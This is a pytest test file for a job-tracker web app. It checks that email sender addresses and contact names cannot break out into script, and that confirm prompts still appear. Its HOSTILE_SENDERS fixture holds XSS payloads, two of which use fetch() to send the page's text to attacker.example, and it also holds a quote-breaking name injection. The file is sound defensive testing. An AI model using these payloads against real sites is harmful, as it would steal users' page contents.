"""Pages never turn email or contact text into script, and the confirm questions still get asked."""
from html.parser import HTMLParser

import pytest
from fastapi.testclient import TestClient

from jobtracker import db
from jobtracker.web import create_app

# The reproductions from the security review: a sender address that closes a JavaScript string, the tagged-template
# variant that needs no parentheses, and a quoted local part.
HOSTILE_SENDERS = [
    "Recruiter <x'-fetch`//attacker.example/?${document.body.innerText}`-'@attacker.example>",
    "Recruiter <\"x'-fetch(`//attacker.example/?`+document.body.innerText)-'\"@attacker.example>",
    "Recruiter <x'+alert@e.vil>",
]
HOSTILE_NAME = "O'Neil\"); alert(1);//"


class Tags(HTMLParser):
    """Every tag with its attributes, plus the text inside <title>."""

    def __init__(self):
        super().__init__()
        self.tags, self.title, self._in_title, self.scripts_outside_title = [], "", False, 0

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))
        if tag == "title":
            self._in_title = True
        if tag == "script" and not self._in_title:
            self.scripts_outside_title += 1

    def handle_endtag(self, tag):
        if tag == "title":
            self._in_title = False

    def handle_data(self, data):
        if self._in_title:
            self.title += data


def parse(html):
    p = Tags()
    p.feed(html)
    return p


@pytest.fixture
def env(tmp_path):
    path = tmp_path / "t.db"
    conn = db.connect(path)
    acct = db.upsert_account(conn, "gmail", "me@gmail.com")
    conn.execute("UPDATE accounts SET can_reply = 1")
    app = db.create_application(conn, "Acme", "acme", "Analyst", "analyst", "Interview", "2026-10-01T09:00:00Z")
    for i, sender in enumerate(HOSTILE_SENDERS):
        conn.execute("INSERT INTO emails (account_id, provider_msg_id, thread_id, received_at, sender, subject, body, related, event, confidence, application_id) "
                     "VALUES (?, ?, 't', ?, ?, 'Interview times', 'Can you do Tuesday?', 1, 'interview', 'high', ?)",
                     (acct, f"m{i}", f"2026-10-0{i + 2}T09:00:00Z", sender, app))
    conn.execute("INSERT INTO emails (account_id, provider_msg_id, thread_id, received_at, sender, subject, body, related, event, confidence, application_id) "
                 "VALUES (?, 'n1', 'n', '2026-10-07T09:00:00Z', ?, 'Hello', 'Hi there', 1, 'interview', 'high', ?)",
                 (acct, "Sam O'Neil <sam@acme.com>", app))
    conn.execute("INSERT INTO emails (account_id, provider_msg_id, thread_id, received_at, sender, subject, body, related, needs_review, event, confidence) "
                 "VALUES (?, 'r1', 'r', '2026-10-08T09:00:00Z', ?, 'Which job?', 'Is this for you?', 1, 1, 'interview', 'high')",
                 (acct, HOSTILE_SENDERS[0]))
    conn.commit()
    client = TestClient(create_app(path), base_url="http://127.0.0.1:8765", follow_redirects=False)
    client.post("/contacts/edit", data={"key": f"{app}|sam@acme.com", "name": HOSTILE_NAME, "title": "Recruiter"})
    yield conn, client, app


def pages(app):
    return ["/", f"/app/{app}", f"/app/{app}/panel", "/contacts", "/review", "/settings", "/jobs", "/flow"]


def test_no_page_has_an_inline_event_handler_or_javascript_link(env):
    _, client, app = env
    for path in pages(app):
        for tag, attrs in parse(client.get(path).text).tags:
            assert not [a for a in attrs if a.startswith("on")], (path, tag, attrs)
            assert not (attrs.get("href") or "").strip().lower().startswith("javascript:"), (path, tag)


def test_the_reply_question_carries_the_address_as_plain_text(env):
    _, client, app = env
    questions = [a["data-confirm"] for t, a in parse(client.get(f"/app/{app}").text).tags if t == "form" and "data-confirm" in a and "/reply" in a["action"]]
    for sender in HOSTILE_SENDERS:
        address = sender.split("<", 1)[1].rstrip(">")
        assert f"Send this reply to {address}?" in questions


def test_a_name_with_quotes_is_asked_about_intact(env):
    _, client, app = env
    questions = [a["data-confirm"] for t, a in parse(client.get(f"/app/{app}").text).tags if t == "form" and a.get("action") == "/contacts/hide"]
    assert f"Remove {HOSTILE_NAME} from this application?" in questions


@pytest.mark.parametrize("path_of", [lambda app: f"/app/{app}", lambda app: f"/app/{app}/panel"])
def test_delete_and_not_an_application_still_ask_first(env, path_of):
    _, client, app = env
    forms = {a["action"] + a.get("data-confirm", "")[:12]: a for t, a in parse(client.get(path_of(app)).text).tags if t == "form" and "data-confirm" in a}
    actions = {a["action"] for a in forms.values()}
    assert {f"/app/{app}/delete", f"/app/{app}/not-application"} <= actions
    assert all(a["data-confirm"].strip() for a in forms.values())


def test_one_capture_phase_listener_asks_every_data_confirm_question(env):
    _, client, app = env
    html = client.get("/").text
    assert html.count("dataset.confirm") == 1
    # capture phase, so a cancel is already set when the list's panel forms and the busy-button handler look at it
    assert "if (message && !confirm(message)) e.preventDefault();\n  }, true);" in html


def test_the_application_page_title_is_clean_and_its_script_is_outside_it(env):
    _, client, app = env
    page = parse(client.get(f"/app/{app}").text)
    assert page.title == "Acme · Job Tracker"
    assert page.scripts_outside_title >= 1
    assert "scrollIntoView" in client.get(f"/app/{app}").text.split("</title>", 1)[1]


def test_no_page_title_contains_markup(env):
    _, client, app = env
    for path in pages(app):
        assert "<" not in parse(client.get(path).text).title, path


def test_form_limits_are_the_ones_the_code_enforces(env):
    from jobtracker import config, reply
    _, client, app = env
    page = parse(client.get(f"/app/{app}").text)
    limits = {(t, a.get("name")): a["maxlength"] for t, a in page.tags if "maxlength" in a}
    assert limits[("textarea", "body")] == str(reply.MAX_BODY)
    assert limits[("input", "company")] == str(config.NAME_MAX) and limits[("input", "role")] == str(config.TITLE_MAX)
    assert limits[("input", "name")] == str(config.NAME_MAX) and limits[("input", "title")] == str(config.TITLE_MAX)
